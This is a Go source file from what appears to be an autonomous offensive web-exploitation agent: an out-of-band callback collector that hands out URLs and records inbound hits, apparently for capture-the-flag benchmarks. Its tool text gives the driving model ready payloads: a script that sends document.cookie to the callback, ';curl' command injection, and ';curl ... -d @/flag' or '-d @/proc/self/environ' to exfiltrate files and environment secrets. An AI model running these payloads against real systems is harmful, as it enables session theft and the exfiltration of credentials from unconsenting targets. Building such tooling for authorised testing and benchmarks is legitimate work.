package webagent

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// oob.go is the out-of-band interaction collector -- the offensive agent's own tiny interactsh. Many
// high-value bugs are BLIND: a server-side request forgery, a blind command injection, a blind/stored
// XSS. None reflect anything in the immediate response; the ONLY signal is the target reaching back to
// an attacker-controlled URL. The collector is a small local HTTP listener that hands out per-probe
// callback URLs and records any hit, so the agent can PROVE a blind vuln fired -- and exfil data
// through the callback (an XSS cookie beacon, a flag). Host-side + deterministic like the whole
// webagent; a recorded hit is real evidence (§10), never inferred.

const oobBodyCap = 4096

// oobBodyDisplayHead/Tail bound how much of an exfil body oob_check renders. An OOB callback body IS
// the exfiltrated payload (a file, an env dump), so the cap must be generous enough that a flag landing
// deep in the body still shows -- the old ~300B cap hid it. headTail keeps both ends.
const (
	oobBodyDisplayHead = 1536
	oobBodyDisplayTail = 512
)

// printableOOB makes an exfiltrated callback body readable in the terminal + transcript. Blind-cmdi /
// SSRF exfil channels routinely ship NUL-separated data (/proc/self/environ) or binary blobs; rendered
// raw, the first NUL truncates the display so everything past it (the flag env var) is invisible to the
// operator AND to the driving LLM -- which then wrongly concludes the exfil failed and wastes turns.
// NUL becomes a newline (an env dump reads as KEY=val lines); other non-printable control bytes become
// '.'. Printable ASCII (the literal flag) is untouched, so the grader still matches it (§10).
func printableOOB(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c == 0:
			b.WriteByte('\n')
		case c == '\t' || c == '\n' || c == '\r':
			b.WriteByte(c)
		case c < 0x20 || c == 0x7f:
			b.WriteByte('.')
		default:
			b.WriteByte(c)
		}
	}
	return b.String()
}

// OOBHit is one recorded inbound callback -- the proof a blind vuln fired, and the channel a payload
// exfils data through (query/body).
type OOBHit struct {
	Token  string
	Method string
	Path   string
	Query  string
	Body   string
	Remote string
	At     time.Time
}

// Collector is a local HTTP listener that hands out per-probe callback URLs and records any hit.
type Collector struct {
	baseHost string
	srv      *http.Server
	ln       net.Listener
	mu       sync.Mutex
	hits     []OOBHit
	seq      int
}

// oobHost is the host the TARGET must use to reach the collector: 127.0.0.1 for a same-host target, or
// host.docker.internal for a dockerized target (the XBOW case). Overridable via TSENGINE_OOB_HOST.
func oobHost() string {
	if h := strings.TrimSpace(os.Getenv("TSENGINE_OOB_HOST")); h != "" {
		return h
	}
	return "127.0.0.1"
}

// NewCollector builds a collector that advertises baseHost to the target (empty -> 127.0.0.1).
func NewCollector(baseHost string) *Collector {
	if baseHost == "" {
		baseHost = "127.0.0.1"
	}
	return &Collector{baseHost: baseHost}
}

// Start binds an ephemeral port on all interfaces (so a dockerized target can reach it) and serves.
func (c *Collector) Start() error {
	ln, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		return err
	}
	c.ln = ln
	mux := http.NewServeMux()
	mux.HandleFunc("/", c.record)
	c.srv = &http.Server{Handler: mux, ReadHeaderTimeout: 5 * time.Second}
	go func() { _ = c.srv.Serve(ln) }()
	return nil
}

// Port is the bound port (valid after Start).
func (c *Collector) Port() int {
	if c.ln == nil {
		return 0
	}
	return c.ln.Addr().(*net.TCPAddr).Port
}

// Stop shuts the listener down (best-effort).
func (c *Collector) Stop() {
	if c.srv != nil {
		_ = c.srv.Close()
	}
}

func (c *Collector) record(w http.ResponseWriter, r *http.Request) {
	token := strings.Trim(r.URL.Path, "/")
	if i := strings.IndexByte(token, '/'); i >= 0 {
		token = token[:i]
	}
	var body string
	if r.Body != nil {
		b, _ := io.ReadAll(io.LimitReader(r.Body, oobBodyCap))
		body = string(b)
	}
	c.mu.Lock()
	c.hits = append(c.hits, OOBHit{
		Token: token, Method: r.Method, Path: r.URL.Path, Query: r.URL.RawQuery,
		Body: body, Remote: r.RemoteAddr, At: time.Now(),
	})
	c.mu.Unlock()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("ok"))
}

// Mint returns a fresh callback URL + its token for the agent to embed in a payload.
func (c *Collector) Mint() (callbackURL, token string) {
	c.mu.Lock()
	c.seq++
	seq := c.seq
	c.mu.Unlock()
	token = fmt.Sprintf("z%d%s", seq, randHex(4))
	return fmt.Sprintf("http://%s:%d/%s", c.baseHost, c.Port(), token), token
}

// Hits returns callbacks recorded for token (all hits when token == "").
func (c *Collector) Hits(token string) []OOBHit {
	c.mu.Lock()
	defer c.mu.Unlock()
	var out []OOBHit
	for _, h := range c.hits {
		if token == "" || h.Token == token {
			out = append(out, h)
		}
	}
	return out
}

func randHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "0000"
	}
	return hex.EncodeToString(b)
}

// --- tools ---

// tOOBURL mints a callback URL, lazily starting the collector on first use.
func tOOBURL(cc *Context, _ map[string]any) string {
	if cc.oob == nil {
		col := NewCollector(oobHost())
		if err := col.Start(); err != nil {
			return "OOB collector unavailable: " + err.Error()
		}
		cc.oob = col
	}
	url, token := cc.oob.Mint()
	return fmt.Sprintf(
		"OOB callback URL: %s  (token: %s)\n"+
			"Embed it where a BLIND vuln would reach out, then oob_check(token=%q):\n"+
			"  - SSRF: point the vulnerable fetch/url param at %s\n"+
			"  - blind XSS / exfil: <script>fetch('%s?c='+encodeURIComponent(document.cookie))</script>\n"+
			"  - blind cmd-injection: ;curl %s  (or a wget/nslookup of the host)\n"+
			"  - exfil a file/env through the body: ;curl %s -d @/flag   or   -d @/proc/self/environ  (the body is rendered readably even when NUL-separated, so a flag env var past the first NUL still shows)\n"+
			"A recorded hit PROVES the target reached back (the blind signal); its query/body carries anything you exfil (a cookie, a flag).",
		url, token, token, url, url, url, url)
}

// tOOBCheck reports callbacks recorded so far (optionally filtered by token).
func tOOBCheck(cc *Context, args map[string]any) string {
	if cc.oob == nil {
		return "no OOB collector running yet -- call oob_url first to get a callback URL to embed."
	}
	token := strings.TrimSpace(argStr(args, "token"))
	hits := cc.oob.Hits(token)
	if len(hits) == 0 {
		where := ""
		if token != "" {
			where = " for token " + token
		}
		return "no OOB callbacks received yet" + where + " -- the target has not reached back (blind vuln unconfirmed, or the payload needs a different vector / more time)."
	}
	var b strings.Builder
	fmt.Fprintf(&b, "%d OOB callback(s) received -- the target reached the collector (blind interaction CONFIRMED):\n", len(hits))
	for i, h := range hits {
		if i >= 10 {
			fmt.Fprintf(&b, "  ... (+%d more)\n", len(hits)-10)
			break
		}
		line := fmt.Sprintf("  [%s] %s %s", h.Token, h.Method, h.Path)
		if h.Query != "" {
			line += "?" + h.Query
		}
		b.WriteString(line + "\n")
		if h.Body != "" {
			bd := printableOOB(headTail(h.Body, oobBodyDisplayHead, oobBodyDisplayTail))
			b.WriteString("      body: " + bd + "\n")
		}
	}
	// A confirmed callback is grounded, citable evidence: emit a Turn carrying the oob_interaction
	// indicator so record_finding(class="ssrf", evidence=[this turn]) passes the grounding gate. Only a
	// REAL recorded hit reaches here, so the indicator is false-positive-free by construction (§10). The
	// hit's token is stored on the Turn.Payload so confirm_exploit can re-verify the durable callback.
	tok := token
	if tok == "" {
		tok = hits[0].Token
	}
	cc.turnN++
	tid := fmt.Sprintf("t-%03d", cc.turnN)
	cc.History = append(cc.History, Turn{
		ID: tid, Method: "oob_check", Payload: tok, Status: 200,
		Indicators: []string{"oob_interaction"}, Elapsed: "0s", RespSnippet: b.String(),
	})
	fmt.Fprintf(&b, "\n[%s] oob_interaction — cite this turn to record_finding(class=\"ssrf\", evidence=[\"%s\"]).", tid, tid)
	return b.String()
}
